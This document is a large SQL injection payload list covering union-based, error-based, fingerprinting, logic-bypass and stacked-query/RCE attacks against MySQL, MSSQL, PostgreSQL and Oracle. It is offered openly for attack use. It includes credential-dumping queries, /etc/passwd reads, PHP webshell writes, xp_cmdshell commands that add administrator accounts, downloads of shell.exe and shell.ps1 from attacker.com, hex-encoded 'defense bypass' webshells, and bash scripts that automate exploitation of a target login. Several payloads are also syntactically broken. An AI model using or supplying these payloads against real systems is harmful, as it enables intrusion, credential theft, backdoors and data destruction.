### 1.2 Union-based SQLi (Column Matching & Modern Obfuscation) & ### 1.3 Error-based SQLi


1. ' UNION SELECT 1--
2. ' UNION SELECT 1,2--
3. ' UNION SELECT 1,2,3--
4. ' UNION SELECT 1,2,3,4--
5. ' UNION SELECT NULL--
6. ' UNION SELECT NULL,NULL--
7. ' UNION SELECT NULL,NULL,NULL--
8. ' UNION ALL SELECT 1--
9. ' UNION ALL SELECT 1,2--
10. ' UNION ALL SELECT 1,2,3--

11. admin' UNION SELECT 1--
12. admin' UNION SELECT 1,2--
13. admin' UNION SELECT 1,2,3--
14. admin' UNION SELECT NULL--
15. admin' UNION ALL SELECT 1--

16. 1' UNION SELECT 1--
17. 1' UNION SELECT 1,2--
18. 1' UNION SELECT NULL--
19. 1' UNION ALL SELECT 1--

20. ) UNION SELECT 1--
21. ) UNION SELECT 1,2--
22. ) UNION SELECT NULL--
23. ) UNION ALL SELECT 1--

24. ' UNION SELECT 1,@@version--
25. ' UNION SELECT 1,database(),3--
26. ' UNION SELECT 1,user(),database()--
27. ' UNION SELECT 1,schema_name FROM information_schema.schemata--
28. ' UNION SELECT 1,table_name FROM information_schema.tables--

29. admin' UNION SELECT 1,@@version--
30. admin' UNION SELECT NULL,user(),password--
31. admin' UNION SELECT 1,database()--
32. admin' UNION SELECT table_name FROM information_schema.tables--

33. ' UNION SELECT username,password FROM users--
34. ' UNION SELECT login,pass FROM admins--
35. ' UNION SELECT user,pass FROM members--
36. ' UNION SELECT username,password FROM accounts--

37. admin' UNION SELECT username,password FROM users--
38. admin' UNION SELECT login,pass FROM admins--
39. admin' UNION SELECT user,pass FROM members--

40. ' UNION ALL SELECT NULL,username,password--
41. ' UNION ALL SELECT NULL,login,pass--
42. ' UNION ALL SELECT NULL,user,pass--
43. ' UNION ALL SELECT NULL,username,password,NULL--

44. 1' UNION ALL SELECT 1,username,password--
45. 1' UNION ALL SELECT NULL,user,pass--

46. ' UNION SELECT 1,2,concat(username,':',password) FROM users--
47. ' UNION SELECT 1,2,concat(login,':',pass) FROM admins--
48. ' UNION SELECT NULL,NULL,group_concat(username,0x3a,password) FROM users--

49. admin' UNION SELECT table_name,column_name FROM information_schema.columns--
50. admin' UNION SELECT NULL,table_name FROM information_schema.tables--

51. ' UNION SELECT 1 FROM dual--
52. ' UNION SELECT 1,2 FROM dual--
53. ' UNION SELECT NULL FROM dual--

54. ' UNION SELECT banner FROM v$version--
55. ' UNION SELECT username,password FROM dba_users--
56. ' UNION SELECT table_name FROM all_tables--

57. ' UNION SELECT 1,pg_user--
58. ' UNION SELECT usename,passwd FROM pg_shadow--
59. ' UNION SELECT schemaname,tablename FROM pg_tables--

60. 1' UNION SELECT 1,2--
61. 1' UNION SELECT NULL,@@version--
62. 1' UNION SELECT table_name FROM information_schema.tables--

63. )' UNION SELECT 1--
64. )' UNION SELECT 1,2--
65. )' UNION SELECT NULL--

66. ' UNION SELECT 1,2,3 UNION SELECT 4,5,6--
67. ' UNION ALL SELECT 1,2,3 UNION ALL SELECT 4,5,6--

68. ' UNION SELECT 1,(SELECT table_name FROM information_schema.tables LIMIT 1)--
69. ' UNION SELECT 1,(SELECT column_name FROM information_schema.columns LIMIT 1)--

70. admin' UNION SELECT 1,load_file('/etc/passwd')--
71. admin' UNION SELECT 1,hex(load_file('/etc/passwd'))--

72. ' UNION SELECT 1,2,unhex(hex(username)) FROM users--
73. ' UNION SELECT 1,2,hex(password) FROM users--

74. ' UNION SELECT COUNT(*) FROM users--
75. ' UNION SELECT COUNT(*) FROM information_schema.tables--

76. ' UNION SELECT 1,@@datadir--
77. ' UNION SELECT 1,@@basedir--
78. ' UNION SELECT 1,@@version_compile_os--

79. admin' UNION SELECT NULL,user,password FROM mysql.user--
80. admin' UNION SELECT NULL,Host,User FROM mysql.user--

81. ' UNION SELECT 1,2,3 OFFSET 1--
82. ' UNION SELECT 1,2,3 LIMIT 1--

83. ' UNION SELECT * FROM (SELECT 1)a--
84. ' UNION SELECT * FROM (SELECT 1,2)b--

85. 1 UNION SELECT 1--
86. 1 UNION SELECT 1,2--
87. 1 UNION SELECT NULL--

88. ' UNION SELECT 1 WHERE 1=1--
89. ' UNION SELECT 1,2 WHERE 1=1--

90. admin' UNION SELECT 1 ORDER BY 1--
91. admin' UNION SELECT 1 LIMIT 1--

92. '; UNION SELECT 1--
93. '; UNION SELECT 1,2--
94. '; UNION ALL SELECT 1--

95. ' OR 1=1 UNION SELECT 1--
96. ' OR 1=1 UNION SELECT 1,2--
97. admin' OR 1=1 UNION SELECT 1--

98. ' UNION SELECT 1# 
99. ' UNION SELECT 1/*
100. ' UNION SELECT 1,2/**/--



### 1.3 Error-based SQLi

ERROR-BASED LOGIN BYPASS PAYLOADS (100+)

1. MySQL ExtractValue/UPDATEXML (30+)



1. ' AND EXTRACTVALUE(1,concat(0x7e,(SELECT @@version),0x7e))--
2. ' AND EXTRACTVALUE(1,concat(0x7e,(SELECT database()),0x7e))--
3. ' AND EXTRACTVALUE(1,concat(0x7e,user(),0x7e))--
4. ' AND EXTRACTVALUE(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1),0x7e))--
5. admin' AND EXTRACTVALUE(1,concat(0x7e,(SELECT @@version),0x7e))--

6. ' AND UPDATEXML(1,concat(0x7e,(SELECT @@version),0x7e),1)--
7. ' AND UPDATEXML(1,concat(0x7e,database(),0x7e),1)--
8. ' AND UPDATEXML(1,concat(0x7e,(SELECT user()),0x7e),1)--
9. admin' AND UPDATEXML(1,concat(0x7e,(SELECT @@version),0x7e),1)--

10. ' AND EXTRACTVALUE(999,concat(0x3a,(SELECT @@version),0x3a))--
11. ' AND EXTRACTVALUE(0x1e,concat(0x3a,database(),0x3a))--

2. MySQL CAST/CONVERT Errors (25+)



12. ' AND 1=CAST((SELECT @@version) AS INT)--
13. ' AND 1=CAST((SELECT database()) AS INT)--
14. ' AND 1=CAST((SELECT user()) AS INT)--
15. admin' AND 1=CAST((SELECT @@version) AS INT)--

16. ' AND 1=CONVERT(INT,(SELECT @@version))--
17. ' AND 1=CONVERT(INT,(SELECT database()))--
18. ' AND 1=CONVERT(VARCHAR,(SELECT @@version))--

19. ' AND 1=CAST(@@version AS SIGNED)--
20. ' AND 1=CAST(database() AS SIGNED)--
21. admin' AND 1=CAST(user() AS SIGNED)--

22. ' OR 1=CAST((CHR(113)||CHR(106)||CHR(113))||(SELECT database())||CHR(113)||CHR(106)||CHR(113) AS CHAR)--
23. admin' OR 1=CAST((SELECT @@version) AS CHAR)--

3. MySQL BIGINT/Geometry Errors (20+)



24. ' AND (SELECT 1 FROM (SELECT COUNT(*),concat((SELECT @@version),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
25. ' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
26. ' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT NULL UNION SELECT !1)a GROUP BY CONCAT((SELECT @@version),FLOOR(RAND(0)*2)))--
27. admin' AND (SELECT 1 FROM (SELECT COUNT(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--

4. MSSQL-Specific Errors (15+)

28. ' AND 1=CAST((SELECT @@version) AS INT)--
29. '; DECLARE @q VARCHAR(99);SET @q=CAST(DB_NAME() AS VARCHAR(99));SELECT @q--
30. admin'; DECLARE @q VARCHAR(99);SET @q=CAST(@@version AS VARCHAR(99));SELECT @q--

31. ' AND 1=CONVERT(int,(SELECT @@version))--
32. ' AND 1=CONVERT(datetime,(SELECT @@version))--
33. admin' AND 1=CONVERT(int,database())--

5. PostgreSQL Errors (10+)



34. ' AND 1=CAST((SELECT version()) AS INT)--
35. ' AND 1=CAST((SELECT current_database()) AS INT)--
36. admin' AND 1=CAST((SELECT current_user) AS INT)--
ADVANCED ERROR EXTRACTION PAYLOADS (50+)

6. ASCII Character Extraction (15+)



37. admin' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
38. admin' AND ASCII(SUBSTRING((SELECT @@version),1,1))>53--
39. ' AND ASCII(SUBSTRING(user(),1,1))>114--
40. admin' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1))>97--

7. LENGTH-Based Errors (10+)



41. admin' AND LENGTH((SELECT * FROM users LIMIT 1))=10--
42. ' AND LENGTH(database())=5--
43. admin' AND LENGTH(@@version)>10--

8. Multi-Query Error Chains (10+)



44. '; SELECT * FROM (SELECT(SLEEP(5)))a; --
45. ' AND 1=0; SELECT @@version; --
46. admin'; SELECT CAST(@@version AS SIGNED); --
URL-ENCODED ERROR PAYLOADS (20+)



47. %27%20AND%20EXTRACTVALUE%281%2Cconcat%280x7e%2C%28SELECT%20%40%40version%29%2C0x7e%29%29--
48. %27%20AND%201%3DCONVERT%28INT%2C%28SELECT%20%40%40version%29%29--
49. %27%20AND%20EXTRACTVALUE%281%2Cconcat%280x3a%2Cdatabase%28%29%2C0x3a%29%29--
ERROR-BASED EXPLOITATION WORKFLOW:



1. Trigger basic error:
   ' AND 1=CAST(@@version AS INT)--

2. Extract version:
   ' AND EXTRACTVALUE(1,concat(0x7e,(SELECT @@version),0x7e))--

3. Extract database:
   ' AND EXTRACTVALUE(1,concat(0x7e,(SELECT database()),0x7e))--

4. Enumerate tables:
   ' AND EXTRACTVALUE(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1),0x7e))--

5. Blind char-by-char:
   admin' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1))>97--

Burp Intruder Setup:



§admin' AND EXTRACTVALUE(1,concat(0x7e,(SELECT @@version),0x7e))--§
Payloads: Step through database(), user(), table_name, etc.


DATABASE FINGERPRINTING PAYLOADS (200+)
1. MySQL Fingerprinting (40+)



1. ' AND @@version LIKE '%MySQL%'--
2. ' AND SUBSTRING(@@version,1,5)='5.7.%'--
3. ' AND SUBSTRING(@@version,1,5)='8.0.%'--
4. admin' AND @@version_compile_os LIKE '%Linux%'--
5. ' AND database()='information_schema'--

6. ' AND 1=CAST(@@version AS SIGNED)--
7. ' AND EXTRACTVALUE(1,@@version)--
8. ' AND 1=CONVERT(@@version,UNSIGNED)--

9. admin' AND 1=1 AND @@datadir LIKE '%mysql%'--
10. ' OR @@basedir IS NOT NULL--

11. ' AND (SELECT COUNT(*) FROM mysql.user)>0--
12. ' AND (SELECT COUNT(@@version))>0--
13. admin' AND SCHEMA()='mysql'--
2. MSSQL Fingerprinting (30+)



14. ' AND @@version LIKE '%Microsoft%'--
15. ' AND @@version LIKE '%SQL Server%'--
16. ' AND SYSTEM_USER IS NOT NULL--
17. admin' AND 1=DB_ID()--

18. '; SELECT @@version--
19. ' AND 1=1; IF @@version IS NOT NULL SELECT 1--
20. admin' AND USER_NAME() IS NOT NULL--

21. ' AND (SELECT COUNT(*) FROM master..sysdatabases)>0--
22. ' AND (SELECT COUNT(*) FROM sysobjects)>0--
23. admin' AND 1=(SELECT COUNT(*) FROM sysusers)--
3. PostgreSQL Fingerprinting (25+)



24. ' AND version() LIKE '%PostgreSQL%'--
25. ' AND current_database() IS NOT NULL--
26. admin' AND (SELECT COUNT(*) FROM pg_class)>0--

27. ' OR 1=1 AND (SELECT COUNT(*) FROM pg_user)>0--
28. ' AND 1=1 AND EXISTS(SELECT 1 FROM pg_tables)--
29. admin' AND current_user IS NOT NULL--
4. Oracle Fingerprinting (25+)



30. ' AND banner FROM v$version IS NOT NULL--
31. ' OR 1=1 AND (SELECT COUNT(*) FROM all_users)>0--
32. admin' AND 1=(SELECT COUNT(*) FROM all_tables)--

33. ' AND 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('A',1)=1--
34. ' OR DBMS_LOCK.SLEEP(1)=0--
35. admin' AND USER IS NOT NULL--
5. LOGIC BYPASS PAYLOADS (60+)



36. ' OR 1=1 AND 1=1--
37. ' OR 1=1 AND '1'='1--
38. admin' OR (1=1 AND 1=1)--
39. ' OR TRUE--
40. ' OR 1--

41. ') OR ('1'='1--
42. ") OR ("1"="1--
43. '; OR 1=1--
44. ' OR EXISTS(SELECT * FROM dual)--

45. admin' OR 1=1 AND SLEEP(0)--
46. ' OR 1=1 GROUP BY 1--
47. ' OR 1=1 ORDER BY 1--
48. ' OR 1=1 LIMIT 1--

49. ' OR 1 IN (SELECT 1)--
50. admin' OR 1 IN (SELECT table_name FROM information_schema.tables)--
ADVANCED FINGERPRINTING TECHNIQUES
6. Version-Specific Detection (30+)



51. ' AND @@version REGEXP '5\.5\.'--
52. ' AND @@version REGEXP '5\.6\.'--
53. ' AND @@version REGEXP '5\.7\.'--
54. ' AND @@version REGEXP '8\.0\.'--

55. admin' AND ASCII(SUBSTRING(@@version,1,1))=53--
56. admin' AND ASCII(SUBSTRING(@@version,2,1))=46--
57. ' AND SUBSTRING(@@version_compile_os,1,5)='linux'--

58. ' AND @@version LIKE '%MariaDB%'--
59. ' AND version() LIKE '%9.%'--
60. admin' AND @@version LIKE '%10.%'--
7. Function Existence Tests (25+)



61. ' AND IFNULL(1,2)=1--
62. ' AND COALESCE(1,2)=1--
63. admin' AND CONCAT(1,2)=3--

64. ' AND CHAR_LENGTH(database())>0--
65. ' AND LENGTH(@@version)>0--
66. admin' AND BIT_LENGTH(1)=8--

67. '; SELECT PG_SLEEP(0); --
68. ' AND DBMS_RANDOM.VALUE IS NOT NULL--
69. admin' AND CTXSYS.DRITHSX.SN(1,1)=1--
8. Table/Column Enumeration (30+)



70. ' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
71. admin' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())>0--

72. ' OR EXISTS(SELECT * FROM users)--
73. ' AND EXISTS(SELECT * FROM admins)--
74. admin' OR EXISTS(SELECT * FROM members)--

75. ' AND (SELECT COUNT(*) FROM mysql.user)>0--
76. ' AND (SELECT COUNT(*) FROM sysobjects)>0--
77. admin' AND (SELECT COUNT(*) FROM pg_class)>0--
STEALTH FINGERPRINTING PAYLOADS
9. Low-Noise Boolean (20+)



78. admin' AND 1=1 AND 1--
79. ' AND 'a'='a'--
80. 1' AND '1'='1--
81. admin' AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1--

82. ' OR NULL IS NULL--
83. admin' OR COALESCE(1,0)=1--
84. ' AND NOT (1=2)--
10. Time-Based Fingerprint (15+)



85. admin' AND IF(@@version LIKE '%MySQL%',SLEEP(2),0)--
86. ' OR IF(@@version LIKE '%SQL Server%',WAITFOR DELAY '0:0:2',0)--
87. admin' AND IF(version() LIKE '%PostgreSQL%',PG_SLEEP(2),0)--
AUTOMATED FINGERPRINTING SCRIPT
bash



#!/bin/bash
# db_fingerprint.sh
targets=("http://target.com/login")
payloads=(
  "' AND @@version LIKE '%MySQL%'"
  "' AND @@version LIKE '%Microsoft%'"
  "' AND version() LIKE '%PostgreSQL%'"
  "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('A',1)"
)

for target in "${targets[@]}"; do
  for payload in "${payloads[@]}"; do
    response=$(curl -s -d "user=admin${payload}&pass=pass" $target)
    if [[ $response == *"200"* || $response == *"302"* ]]; then
      echo "[+] Possible $payload match"
    fi
  done
done
BURP INTRUDER FINGERPRINT SETUP



Positions: user=§admin' AND @@version LIKE '%§MySQL§%'--§
Payload Sets:
1. MySQL, MariaDB, 5.7, 8.0
2. Microsoft SQL Server 201X
3. PostgreSQL 9/10/11/12/13
4. Oracle 11g/12c/19c
IDENTIFICATION MATRIX:



MySQL 5.x: @@version, CAST(), EXTRACTVALUE()
MySQL 8.x: @@version_compile_os, schema()
MSSQL: @@version, WAITFOR DELAY, sysobjects
PostgreSQL: version(), pg_class, PG_SLEEP()
Oracle: v$version, all_users, DBMS_PIPE


STACKED QUERIES & RCE PAYLOADS (200+)
1. MySQL Stacked Queries (40+)



1. '; SELECT * FROM users; --
2. '; DROP TABLE temp; --
3. '; CREATE TABLE temp(id INT); --
4. admin'; SELECT @@version; --

5. '; SELECT LOAD_FILE('/etc/passwd'); --
6. '; SELECT LOAD_FILE(0x2f6574632f706173737764); --
7. admin'; SELECT HEX(LOAD_FILE('/etc/passwd')); --

8. '; UPDATE users SET password='hacked' WHERE id=1; --
9. '; INSERT INTO users VALUES (999,'hacker','hacked'); --
10. '; DELETE FROM users WHERE id=1; --

11. '; SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php'; --
12. admin'; SELECT "<?php passthru($_GET['c']); ?>" INTO DUMPFILE "/tmp/shell.php'; --
2. MSSQL Stacked + RCE (40+)



13. '; EXEC xp_cmdshell 'whoami'--
14. '; EXEC xp_cmdshell 'net user hacker hacked /add'--
15. admin'; EXEC sp_executesql 'SELECT * FROM users'--

16. '; EXEC master..xp_cmdshell 'dir'--
17. '; EXEC sp_configure 'show advanced options',1;RECONFIGURE;--
18. '; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--

19. '; DECLARE @a VARCHAR(99);EXEC(@a='SELECT @@version'); --
20. admin'; EXEC('SELECT * FROM OPENROWSET(''SQLOLEDB'',''server=.;trusted_connection=yes'',''SELECT 1'')')--

21. '; EXEC xp_cmdshell 'powershell.exe -c Write-Host "RCE"'--
22. '; EXEC xp_cmdshell 'certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe'--
3. PostgreSQL Stacked (25+)



23. '; SELECT pg_sleep(5); --
24. '; COPY (SELECT '<?php system($_GET['cmd']); ?>') TO '/tmp/shell.php'; --
25. admin'; CREATE TABLE temp AS SELECT version(); --

26. '; COPY users TO '/tmp/users.txt'; --
27. '; COPY (SELECT current_user) TO '/var/log/shell.txt'; --
28. '; SELECT '<?php eval($_POST[1]); ?>'::text; --

29. '; INSERT INTO pg_largeobject (loid, pageno, data) VALUES (12345, 0, decode('PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7','base64')); --
4. Oracle Stacked + UTL_FILE RCE (25+)



30. '; BEGIN DBMS_LOCK.SLEEP(5); END; --
31. '; SELECT UTL_FILE.FCOPY('SYS.SQL_DIR','shell.php','/tmp','shell.php'); --
32. admin'; BEGIN EXECUTE IMMEDIATE 'SELECT * FROM users'; END; --

33. '; DECLARE PRAGMA UTL_FILE; fhandle UTL_FILE.FILE_TYPE; BEGIN fhandle := UTL_FILE.FOPEN('DIR','shell.php','w'); UTL_FILE.PUT_LINE(fhandle,'<?php system($_GET['cmd']); ?>'); UTL_FILE.FCLOSE(fhandle); END; --
5. MySQL UDF/Plugin RCE (20+)



34. '; CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so'; SELECT sys_exec('whoami'); --
35. '; SELECT unhex(hex('<?php system($_GET['cmd']); ?>')) INTO DUMPFILE '/var/www/html/shell.php'; --

36. admin'; SELECT 1; CREATE TABLE IF NOT EXISTS `pwned` ( `test` TEXT ); SELECT LOAD_FILE('/etc/passwd') INTO DUMPFILE '/var/www/html/pwned.php'; --
RCE COMMAND CHAINS
6. Linux RCE via SQL (30+)



37. '; SELECT "<?php system('whoami'); ?>" INTO OUTFILE "/var/www/html/rce.php"; --
38. '; SELECT "<?php passthru('id'); ?>" INTO DUMPFILE "/tmp/id.php"; --

39. admin'; SELECT "<?php echo shell_exec('uname -a'); ?>" INTO OUTFILE "/var/www/html/info.php"; --
40. '; SELECT "<?php echo `whoami`; ?>" INTO OUTFILE "/shell.php"; --

41. '; SELECT "<?php if(isset($_GET['cmd'])){ echo `<$_GET['cmd']>`; } ?>" INTO OUTFILE "/var/www/html/cmd.php"; --
42. admin'; SELECT "<?php @eval($_POST['phpcode']); ?>" INTO OUTFILE "/backdoor.php"; --
7. Windows RCE via SQL (25+)



43. '; EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php'--
44. '; EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"'--

45. admin'; EXEC master..xp_cmdshell 'certutil -urlcache -f http://attacker.com/shell.exe C:\temp\shell.exe && C:\temp\shell.exe'--
46. '; EXEC xp_cmdshell 'net user hacker Password123! /add && net localgroup administrators hacker /add'--
8. Stacked Query Chaining (25+)



47. '; SELECT * FROM users; SELECT @@version; --
48. admin'; DROP TABLE IF EXISTS temp; CREATE TABLE temp(id INT); INSERT INTO temp VALUES(1); --
49. '; UPDATE users SET password=MD5('hacked') WHERE username=''admin''; SELECT SLEEP(0); --

50. '; SELECT 1; SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE "/var/www/html/shell.php"; SELECT 2; --
51. admin'; EXEC sp_executesql N'SELECT 1'; EXEC xp_cmdshell ''whoami''; --
URL-ENCODED RCE PAYLOADS (20+)



52. %27%3B%20SELECT%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%20INTO%20OUTFILE%20%22%2Fvar%2Fwww%2Fhtml%2Frce.php%22%3B%20--
53. %27%3B%20EXEC%20xp_cmdshell%20%27whoami%27--
RCE EXPLOITATION WORKFLOW:



1. Confirm stacked queries:
   '; SELECT SLEEP(5); --

2. Write webshell:
   '; SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"; --

3. Verify shell:
   curl "http://target/shell.php?cmd=whoami"

4. Privilege escalation:
   '; EXEC xp_cmdshell 'net localgroup administrators hacker /add'--
AUTOMATED RCE DEPLOYMENT:
bash



# Webshell deployer
curl -d "user=admin'; SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'; --&pass=pass" http://target/login

# MSSQL RCE
curl -d "user=admin'; EXEC xp_cmdshell 'whoami'--&pass=pass" http://target/login
DEFENSE BYPASS VARIANTS:



54. '; SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e INTO DUMPFILE "/shell.php"; --
55. admin'; EXEC('master..xp_cmdshell ''dir'''); --
56. '; SELECT unhex('3c3f7068702073797374656d28245f504f53545b2263225d293b3f3e') INTO OUTFILE "/rce.php"; --
